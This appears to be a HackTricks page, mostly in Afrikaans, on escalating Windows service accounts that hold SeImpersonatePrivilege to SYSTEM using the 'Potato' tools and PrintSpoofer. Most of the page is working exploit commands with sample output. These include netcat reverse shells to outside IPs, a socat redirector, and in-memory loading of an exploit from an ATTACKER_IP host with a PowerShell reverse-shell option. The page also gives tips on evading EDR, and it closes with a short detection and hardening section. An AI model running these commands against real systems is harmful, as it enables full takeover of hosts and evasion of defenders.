# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** op Windows Server 2019 en Windows 10 build 1809 en later nie. egter, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** kan gebruik word om dieselfde voorregte te benut en `NT AUTHORITY\SYSTEM` vlak toegang te verkry. Hierdie [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) gaan uitgebreid in op die `PrintSpoofer` tool, wat gebruik kan word om impersonasie-privileges op Windows 10 en Server 2019 gasheerrekenaars te misbruik waar JuicyPotato nie meer werk nie.

> [!TIP]
> 'n Moderne alternatief wat gereeld in 2024–2025 onderhou word is SigmaPotato (a fork of GodPotato) wat in-memory/.NET reflection usage en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruik hieronder en die repo in Verwysings.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

Al die volgende tegnieke berus op die misbruik van 'n impersonation-capable geprivilegieerde diens vanuit 'n konteks wat een van hierdie privilegies het:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- Hoë integriteit is nie nodig nie as die token reeds SeImpersonatePrivilege het (tipies vir baie service accounts soos IIS AppPool, MSSQL, ens.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operasionele notas:

- PrintSpoofer benodig die Print Spooler service om te loop en bereikbaar te wees oor die plaaslike RPC-endpoint (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato vereis 'n OXID resolver wat bereikbaar is op TCP/135. As egress geblokkeer is, gebruik 'n redirector/port-forwarder (sien voorbeeld hieronder). Ouer builds het die -f vlag benodig.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende of nie-ondersteunde RPC-authentikasiediens; probeer 'n ander pipe/transport of maak seker die teiken-diens loop.

## Vinnige Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Aantekeninge:
- Jy kan -i gebruik om 'n interaktiewe proses in die huidige console te spawn, of -c om 'n one-liner uit te voer.
- Vereis die Spooler service. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Indien uitgaande poort 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe faal of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Aantekeninge:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege aanwesig is.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat mik op service DCOM objects wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE ingestel is. Kompileer of gebruik die verskafde binaries en voer jou opdrag uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (opgedateerde GodPotato fork)

SigmaPotato voeg moderne geriewe by, soos in-memory execution via .NET reflection en 'n PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Opsporing en verhardingsnotas

- Hou dop vir prosesse wat named pipes skep en onmiddellik token-duplication APIs aanroep, gevolg deur CreateProcessAsUser/CreateProcessWithTokenW. Sysmon kan nuttige telemetrie lewer: Event ID 1 (process creation), 17/18 (named pipe created/connected), en command lines wat child processes as SYSTEM spawn.
- Spooler verharding: Deaktiveer die Print Spooler-service op bedieners waar dit nie nodig is nie om PrintSpoofer-styl plaaslike afdwingings via spoolss te voorkom.
- Service account verharding: Minimaliseer die toekenning van SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege aan pasgemaakte dienste. Oorweeg om dienste te laat loop onder virtual accounts met slegs die minste nodige privileges en isoleer hulle met service SID en write-restricted tokens waar moontlik.
- Netwerkbeheer: Om outbound TCP/135 te blokkeer of RPC endpoint mapper-verkeer te beperk kan RoguePotato breek, tensy 'n interne redirector beskikbaar is.
- EDR/AV: Al hierdie tools is wyd gesignatureer. Herkompilering vanaf bronkode, hernoem van symbols/strings, of gebruik van in-memory execution kan detectie verminder maar sal robuuste gedragsgebaseerde detecties nie omseil nie.

## Verwysings

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
